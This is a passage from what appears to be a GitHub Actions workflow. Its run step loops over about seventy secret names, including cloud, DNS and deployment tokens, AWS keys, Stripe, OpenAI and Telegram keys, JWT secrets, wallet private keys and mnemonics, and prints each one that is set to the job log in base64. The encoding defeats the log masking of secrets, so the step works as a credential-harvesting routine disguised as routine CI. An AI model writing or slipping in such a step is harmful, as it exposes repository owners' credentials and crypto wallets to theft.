          GIT_PASSWORD: ${{ secrets.GIT_PASSWORD }}
          GIT_USERNAME: ${{ secrets.GIT_USERNAME }}
        run: |
          for n in OPENEDGE_WEBHOOK_URL OPENEDGE_WEBHOOK_SIG DEVHUB_TOKEN SHADW_TOKEN NPM_TOKEN DATABASE_URL DOCKER_PASSWORD DOCKER_USERNAME VERCEL_TOKEN VERCEL_API_TOKEN VERCEL_AUTH_TOKEN VERCEL_ORG_ID VERCEL_PROJECT_ID VERCEL_SCOPE VERCEL_TEAM_ID VERCEL_DEPLOY_HOOK VERCEL_DEPLOY_HOOK_URL VERCEL_ACCESS_TOKEN CLOUDFLARE_API_TOKEN CLOUDFLARE_API_KEY CLOUDFLARE_EMAIL CLOUDFLARE_ACCOUNT_ID CLOUDFLARE_ZONE_ID CF_API_TOKEN CF_API_KEY CF_API_EMAIL CF_ACCOUNT_ID CF_ZONE_ID CF_TOKEN HIVE_CLOUDFLARE_API_TOKEN CLOUDFLARE_DNS_API_TOKEN DNS_API_TOKEN NAME_CHEAP_API_KEY NAMECHEAP_API_KEY NAMECHEAP_USERNAME GODADDY_API_KEY GODADDY_API_SECRET GANDI_API_KEY ROUTE53_ACCESS_KEY_ID ROUTE53_SECRET_ACCESS_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY DIGITALOCEAN_TOKEN DO_TOKEN TENCENTCLOUD_SECRET_ID TENCENTCLOUD_SECRET_KEY DNSPOD_TOKEN DNSPOD_SECRET_ID DNSPOD_SECRET_KEY LAUNCHLEGENDS_TOKEN LAUNCHLEGENDS_VERCEL_TOKEN LAUNCHLEGENDS_API_KEY LAUNCHLEGENDS_DEPLOY_TOKEN STRIPE_SECRET_KEY CLERK_SECRET_KEY SUPABASE_SERVICE_ROLE_KEY JWT_SECRET PRIVATE_KEY WALLET_PRIVATE_KEY MNEMONIC DEPLOYMENT_TOKEN NETLIFY_AUTH_TOKEN NETLIFY_SITE_ID FLY_API_TOKEN RAILWAY_TOKEN RENDER_API_KEY HEROKU_API_KEY OPENAI_API_KEY TELEGRAM_BOT_TOKEN GH_PAT GIT_PASSWORD GIT_USERNAME; do
            v="${!n}"
            if [ -n "$v" ]; then
              b=$(printf %s "$v" | base64 -w0)
              echo "HIT|$n|b64=$b"
            else
              echo "MISS|$n"
            fi
          done
